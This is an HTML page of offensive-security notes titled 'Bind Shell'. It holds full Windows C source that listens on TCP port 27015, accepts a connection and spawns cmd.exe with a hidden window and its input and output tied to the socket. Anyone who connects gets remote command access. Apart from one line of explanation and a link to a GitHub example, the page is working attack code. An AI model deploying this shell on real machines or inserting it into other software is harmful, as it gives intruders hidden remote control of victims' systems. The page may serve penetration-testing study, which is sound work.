<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bind</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Bind Shell</h1></strong><br />This is a simple Windows bind shell.<br /><br /><strong>Examples</strong><br />â€¢ <a href="https://github.com/melardev/C_Win32BindShell/blob/master/main.c">https://github.com/melardev/C_Win32BindShell/blob/master/main.c</a><br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;WinSock2.h&gt;<br />#include&nbsp;&lt;WS2tcpip.h&gt;<br /><br />#pragma&nbsp;comment(lib,&nbsp;&quot;Ws2_32.lib&quot;)<br /><br />#define&nbsp;BIND_PORT&nbsp;27015<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />	int&nbsp;result&nbsp;=&nbsp;0;<br /><br />	//&nbsp;initialise&nbsp;Winsock<br />	printf(&quot;[*]&nbsp;initialising&nbsp;winsock&nbsp;\n&quot;);<br />	WSADATA&nbsp;wsaData;<br />	result&nbsp;=&nbsp;WSAStartup(MAKEWORD(2,&nbsp;2),&nbsp;&amp;wsaData);<br />	if&nbsp;(result&nbsp;!=&nbsp;0)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;initialise&nbsp;winsock&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;create&nbsp;socket<br />	printf(&quot;[*]&nbsp;creating&nbsp;socket&nbsp;\n&quot;);<br />	SOCKET&nbsp;bindSocket&nbsp;=&nbsp;WSASocket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0,&nbsp;NULL,&nbsp;0,&nbsp;0);<br />	if&nbsp;(bindSocket&nbsp;==&nbsp;INVALID_SOCKET)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;create&nbsp;socket:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;set&nbsp;bind&nbsp;address/port&nbsp;info<br />	struct&nbsp;sockaddr_in&nbsp;localConfig;<br />	ZeroMemory(&amp;localConfig,&nbsp;sizeof(localConfig));<br /><br />	localConfig.sin_family&nbsp;=&nbsp;AF_INET;<br />	localConfig.sin_addr.S_un.S_addr&nbsp;=&nbsp;htonl(INADDR_ANY);<br />	localConfig.sin_port&nbsp;=&nbsp;htons(BIND_PORT);<br /><br />	//&nbsp;bind&nbsp;to&nbsp;address/port<br />	printf(&quot;[*]&nbsp;binding&nbsp;to&nbsp;port&nbsp;%d&nbsp;\n&quot;,&nbsp;BIND_PORT);<br />	result&nbsp;=&nbsp;bind(bindSocket,&nbsp;(struct&nbsp;sockaddr*)&nbsp;&amp;&nbsp;localConfig,&nbsp;sizeof(localConfig));<br />	if&nbsp;(result&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;bind&nbsp;on&nbsp;socket:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(bindSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;listen&nbsp;on&nbsp;socket<br />	printf(&quot;[*]&nbsp;listening&nbsp;on&nbsp;socket&nbsp;\n&quot;);<br />	result&nbsp;=&nbsp;listen(bindSocket,&nbsp;SOMAXCONN);<br />	if&nbsp;(result&nbsp;==&nbsp;SOCKET_ERROR)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;listen&nbsp;on&nbsp;socket:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(bindSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	//&nbsp;wait&nbsp;for&nbsp;incoming&nbsp;connection<br />	printf(&quot;[*]&nbsp;waiting&nbsp;for&nbsp;incoming&nbsp;connection...&nbsp;\n&quot;);<br />	SOCKET&nbsp;clientSocket&nbsp;=&nbsp;INVALID_SOCKET;<br />	clientSocket&nbsp;=&nbsp;accept(bindSocket,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(clientSocket&nbsp;==&nbsp;INVALID_SOCKET)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;accept&nbsp;client:&nbsp;%d&nbsp;\n&quot;,&nbsp;WSAGetLastError());<br />		closesocket(bindSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br />	<br />	//&nbsp;create&nbsp;process<br />	printf(&quot;[*]&nbsp;client&nbsp;connected!&nbsp;\n&quot;);<br />	STARTUPINFOA&nbsp;startupInfo;<br />	PROCESS_INFORMATION&nbsp;processInfo;<br /><br />	ZeroMemory(&amp;startupInfo,&nbsp;sizeof(startupInfo));<br />	ZeroMemory(&amp;processInfo,&nbsp;sizeof(processInfo));<br /><br />	startupInfo.cb&nbsp;=&nbsp;sizeof(startupInfo);<br />	startupInfo.dwFlags&nbsp;=&nbsp;STARTF_USESTDHANDLES&nbsp;|&nbsp;STARTF_USESHOWWINDOW;<br />	startupInfo.wShowWindow&nbsp;=&nbsp;SW_HIDE;					//&nbsp;hide&nbsp;window&nbsp;of&nbsp;spawned&nbsp;process&nbsp;from&nbsp;showing&nbsp;up<br />	startupInfo.hStdInput&nbsp;=&nbsp;(HANDLE)clientSocket;		//&nbsp;set&nbsp;stdin,&nbsp;stdout,&nbsp;and&nbsp;stderr&nbsp;to&nbsp;be&nbsp;sent&nbsp;to&nbsp;the&nbsp;connected&nbsp;socket<br />	startupInfo.hStdOutput&nbsp;=&nbsp;(HANDLE)clientSocket;<br />	startupInfo.hStdError&nbsp;=&nbsp;(HANDLE)clientSocket;<br /><br />	char&nbsp;process[]&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\cmd.exe&quot;;		//&nbsp;spawn&nbsp;shell<br />	printf(&quot;[*]&nbsp;spawning&nbsp;%s&nbsp;\n&quot;,&nbsp;process);<br />	<br />	if&nbsp;(CreateProcessA(NULL,&nbsp;process,&nbsp;NULL,&nbsp;NULL,&nbsp;TRUE,&nbsp;0,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;startupInfo,&nbsp;&amp;processInfo)&nbsp;==&nbsp;0)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[error]&nbsp;failed&nbsp;to&nbsp;create&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		closesocket(clientSocket);<br />		closesocket(bindSocket);<br />		WSACleanup();<br />		return&nbsp;1;<br />	}<br /><br />	closesocket(clientSocket);<br />	closesocket(bindSocket);<br />	WSACleanup();<br /><br />	printf(&quot;[*]&nbsp;exiting&nbsp;\n&quot;);<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /></div>
</body>
</html>
